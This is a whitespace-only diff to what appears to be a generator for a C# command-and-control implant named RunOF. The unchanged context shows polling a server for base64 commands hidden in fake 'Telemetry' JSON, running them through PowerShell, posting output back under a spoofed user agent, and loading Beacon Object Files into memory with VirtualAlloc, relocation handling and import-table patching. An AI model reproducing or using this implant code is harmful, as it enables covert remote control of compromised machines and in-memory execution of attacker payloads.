@@ -90,7 +90,7 @@ def program(ip, port, cfg=None, scheme="https", profile=False):
 		probe_union = '\"Telemetry\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\"|(?:\"cmd\"\\s*:\\s*\"(?<b64>[A-Za-z0-9+/=]+)\")'
 		post_json_expr = '"{\\"output\\":\\"" + outB64 + "\\"}"'"""
 		# legacy hardcoded defaults
-		
+
 		ua = cfg.useragent if cfg.useragent else "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
 		get_url = post_url = f"{base_url}/"
 		get_headers = cfg.headers_get if cfg.headers_get else ""
@@ -304,7 +304,7 @@ namespace RunOF
 							var cmdBytes = Convert.FromBase64String(cmdB64);
 							var cmdText = Encoding.UTF8.GetString(cmdBytes);
 
-							
+
 
 							Log($"Got command {{cmdText}}");
 
@@ -504,7 +504,7 @@ namespace RunOF
 		{{
 			SendPowerShellLines(input,
 				$"Write-Output __OP__{{ID}}__",
-				"Write-Output Ending",                       
+				"Write-Output Ending",
 				$"Write-Output __ENDOP__{{ID}}__");
 
 			try {{
@@ -550,7 +550,7 @@ namespace RunOF
 			}} else {{
 				return null;
 			}}
-		
+
 		}}
 	}}
 }}
@@ -672,7 +672,7 @@ namespace RunOF.Internals
 
 			NativeDeclarations.GetExitCodeThread(hThread, out ExitCode);
 
-			
+
 			if (ExitCode < 0)
 			{
 				Log($"Bof thread exited with code {ExitCode} - see above for exception information. ");
@@ -701,7 +701,7 @@ namespace RunOF.Internals
 			ClearMemory();
 
 			return Response;
-			
+
 		}
 
 		private void ClearMemory()
@@ -759,7 +759,7 @@ namespace RunOF.Internals
 		public int argument_buffer_size { get; set; }
 		private string InternalDLLName { get; set; } = "RunOF";
 
-		private enum ARCH: int 
+		private enum ARCH: int
 		{
 			I386 = 0,
 			AMD64 = 1
@@ -796,7 +796,7 @@ namespace RunOF.Internals
 				this.symbols = new List<IMAGE_SYMBOL>();
 				Log("Set this.symbols to Image symbol");
 
-				// Allocate some memory, for now just the whole size of the object file. 
+				// Allocate some memory, for now just the whole size of the object file.
 				// TODO - could just do the memory for the sections and not the header?
 				// TODO - memory permissions
 
@@ -819,7 +819,7 @@ namespace RunOF.Internals
 
 				Log("Passed arch check");
 
-				// Compilers use different prefixes to symbols depending on architecture. 
+				// Compilers use different prefixes to symbols depending on architecture.
 				// There might be other naming conventions for functions imported in different ways, but I'm not sure.
 				if (this.BofArch == ARCH.I386)
 				{
@@ -942,7 +942,7 @@ namespace RunOF.Internals
 						/*// but we only copy sizeofrawdata (which will almost always be less than the amount we allocated)
 						Marshal.Copy(file_contents, (int)section_header.PointerToRawData, addr, (int)section_header.SizeOfRawData);
 						Log($"Updating section ptrToRawData to {(addr.ToInt64() - this.base_addr.ToInt64()):X}");
-						// We can't directly modify the section header in the list as it's a struct. 
+						// We can't directly modify the section header in the list as it's a struct.
 						// TODO - look at using an array rather than a list
 						// for now, replace it with a new struct with the new offset
 						var new_hdr = section_headers[i];
@@ -956,14 +956,14 @@ namespace RunOF.Internals
 					}
 				}
 
-				
+
 
 				// Process relocations
 				Log("Processing relocations...");
 				section_headers.ForEach(ResolveRelocs);
 
 
-				// Compilers use different prefixes to symbols depending on architecture. 
+				// Compilers use different prefixes to symbols depending on architecture.
 				// There might be other naming conventions for functions imported in different ways, but I'm not sure.
 				if (this.BofArch == ARCH.I386)
 				{
@@ -1014,7 +1014,7 @@ namespace RunOF.Internals
 				//Logger.Debug($"Setting permissions for section {perm.SectionName} @ {perm.Addr.ToInt64():X} to R: {r}, W: {w}, X: {x}");
 
 				NativeDeclarations.VirtualProtect(perm.Addr, (UIntPtr)(perm.Size), page_permissions, out _);
-				
+
 			}
 
 		}
@@ -1030,7 +1030,7 @@ namespace RunOF.Internals
 			bool argument_buffer_length_found = false;
 			IntPtr entry_addr = IntPtr.Zero;
 
-			foreach (var symbol in this.symbols) 
+			foreach (var symbol in this.symbols)
 			{
 				var symbol_name = GetSymbolName(symbol);
 				if ((symbol_name.StartsWith(this.HelperPrefix+"Beacon") || symbol_name.StartsWith(this.HelperPrefix + "toWideChar")) && symbol.Type == IMAGE_SYMBOL_TYPE.IMAGE_SYM_TYPE_FUNC)
@@ -1066,7 +1066,7 @@ namespace RunOF.Internals
 					{
 						Log($"Allocating argument buffer of length {serialised_args.Length}");
 						this.argument_buffer = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)serialised_args.Length, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
-						// Copy our data into it 
+						// Copy our data into it
 						Marshal.Copy(serialised_args, 0, this.argument_buffer, serialised_args.Length);
 
 						var symbol_addr = new IntPtr(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbol.SectionNumber - 1].PointerToRawData);
@@ -1137,7 +1137,7 @@ namespace RunOF.Internals
 					// calculate the address
 					// the formula is our base_address + symbol value + section_offset
 					int i = this.symbols.IndexOf(symbol);
-					entry = (IntPtr)(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbols[i].SectionNumber - 1].PointerToRawData); // TODO not sure about this cast 
+					entry = (IntPtr)(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbols[i].SectionNumber - 1].PointerToRawData); // TODO not sure about this cast
 					Log($"\tFound address {entry.ToInt64():x}");
 
 					// now need to update our IAT with this address
@@ -1154,7 +1154,7 @@ namespace RunOF.Internals
 				throw new Exception("Unable to find entry point");
 			}
 
-		   
+
 		}
 
 		internal void Clear()
@@ -1165,7 +1165,7 @@ namespace RunOF.Internals
 			{
 
 				Log($"Zeroing and freeing loaded global buffer at 0x{this.global_buffer.ToInt64():X} with size 0x{this.global_buffer_size:X}");
-				
+
 				var output_addr = Marshal.ReadIntPtr(this.global_buffer);
 				var output_size = Marshal.ReadInt32(this.global_buffer_size_ptr);
 
@@ -1197,7 +1197,7 @@ namespace RunOF.Internals
 
 
 		}
-		
+
 
 		private bool ArchitectureCheck()
 		{
@@ -1340,10 +1340,10 @@ namespace RunOF.Internals
 						Log($"[Relocs][{i + 1}] Current value @0x{reloc_location.ToInt64():X} = 0x{current_value:X}");
 
 						// How we write our relocation depends on the relocation type and architecture
-						// Note - "in the wild" most of these are not used, which makes it a bit difficult to test. 
-						// For example, in all the BOF files I've seen only four are actually used. 
+						// Note - "in the wild" most of these are not used, which makes it a bit difficult to test.
+						// For example, in all the BOF files I've seen only four are actually used.
 						// An exception will be thrown if not supported
-						// TODO - we should refactor this, but my head is hurting right now. 
+						// TODO - we should refactor this, but my head is hurting right now.
 						// TODO - need to check when in 64 bit mode that any 32 bit relocation's don't overflow (will .net do this for free?)
 
 						switch (reloc.Type)
@@ -1425,7 +1425,7 @@ namespace RunOF.Internals
 						Int32 current_value_32 = Marshal.ReadInt32(reloc_location);
 						Int64 object_addr;
 						Log("MADE IT PAST SETTING INT VARIABLES!!!!!!!!!!!!!!");
-					   
+
 #endif
 						Log($"[Relocs][{i + 1}] Current internal value = 0x{current_value:X}");
 						Log($"Relocation type: {reloc.Type}");
@@ -1585,23 +1585,23 @@ namespace RunOF.Internals
 
 						}
 						Log($"[Relocs][{i + 1}] Internal relocation write OK @0x{reloc_location.ToInt64():X}");
-					}   
+					}
 
 				}
 
 			}
 		}
-			 
+
 		private string GetSymbolName(IMAGE_SYMBOL symbol)
 		{
-			if (symbol.Name[0] == 0 && symbol.Name[1] == 0 && symbol.Name[2] == 0 && symbol.Name[3] == 0) 
+			if (symbol.Name[0] == 0 && symbol.Name[1] == 0 && symbol.Name[2] == 0 && symbol.Name[3] == 0)
 			{
 				// the last four bytes of the Name field contain an offset into the string table.
 				uint offset = BitConverter.ToUInt32(symbol.Name, 4);
 				long position = this.stream.Position;
 				this.stream.Seek(this.string_table + offset, SeekOrigin.Begin);
 
-				// read a C string 
+				// read a C string
 				List<byte> characters = new List<byte>();
 				byte c;
 				while ((c = reader.ReadByte()) != '\0')
@@ -1616,11 +1616,11 @@ namespace RunOF.Internals
 			} else
 			{
 				return Encoding.ASCII.GetString(symbol.Name).Replace("\0", String.Empty);
-			} 
+			}
 
 		}
 
-		private static T Deserialize<T> (byte[] array) 
+		private static T Deserialize<T> (byte[] array)
 			where T:struct
 		{
 			GCHandle handle = GCHandle.Alloc(array, GCHandleType.Pinned);
@@ -1961,7 +1961,7 @@ namespace RunOF.Internals
 			this.iat_entries.Add(dll_name + "$" + func_name, this.iat_addr + (this.iat_count * 4));
 			this.iat_count++;
 
-			return this.iat_entries[dll_name + "$" + func_name]; 
+			return this.iat_entries[dll_name + "$" + func_name];
 
 
 #elif _AMD64
@@ -1977,7 +1977,7 @@ namespace RunOF.Internals
 			Marshal.WriteInt64(this.iat_addr + (this.iat_count * 8), func_address.ToInt64());
 			this.iat_entries.Add(dll_name + "$" + func_name, this.iat_addr + (this.iat_count * 8));
 			this.iat_count++;
-			return this.iat_entries[dll_name + "$" + func_name]; 
+			return this.iat_entries[dll_name + "$" + func_name];
 
 
 #endif
@@ -1989,7 +1989,7 @@ namespace RunOF.Internals
 		{
 			if (!this.iat_entries.ContainsKey(dll_name + "$" + func_name)) throw new Exception($"Unable to update IAT entry for {dll_name + "$" + func_name} as don't have an existing entry for it");
 
-#if _I386       
+#if _I386
 			Marshal.WriteInt32(this.iat_entries[dll_name + "$" + func_name], func_address.ToInt32());
 #elif _AMD64
 			Marshal.WriteInt64(this.iat_entries[dll_name + "$" + func_name], func_address.ToInt64());
@@ -2097,7 +2097,7 @@ namespace RunOF
 		public UInt32 SymbolTableIndex;
 		public IMAGE_RELOCATION_TYPE Type; // TODO this is architecture dependant
 
-	}   
+	}
 
 	public enum IMAGE_RELOCATION_TYPE : ushort
 	{
@@ -2211,7 +2211,7 @@ namespace RunOF.Internals
 
 			[DllImport("kernel32")]
 			public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
-	   
+
 			[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
 			internal static extern bool VirtualFree(IntPtr pAddress, uint size, uint freeType);
 		[DllImport("kernel32.dll")]
@@ -2465,7 +2465,7 @@ namespace RunOF.Internals
 				}
 			}
 
-			// Now read in any optional arguments that get provided to the OF. 
+			// Now read in any optional arguments that get provided to the OF.
 
 			// -------- optional OF args --------
 			for (int i = 0; i < parts.Length; i++)
@@ -2669,7 +2669,7 @@ namespace RunOF.Internals
 				output_bytes.AddRange(of_arg.arg_data);
 			}
 			return output_bytes.ToArray();
-			
+
 		}
 
 		/*public byte[] SerialiseArgs()
@@ -3066,11 +3066,11 @@ namespace RunOF.Internals
 
 
 		public OfArg(byte[] arg_data)
-		{ 
+		{
 			arg_type = ArgType.BINARY;
 			this.arg_data = arg_data;
 		}
-   
+
 	}
 
 }
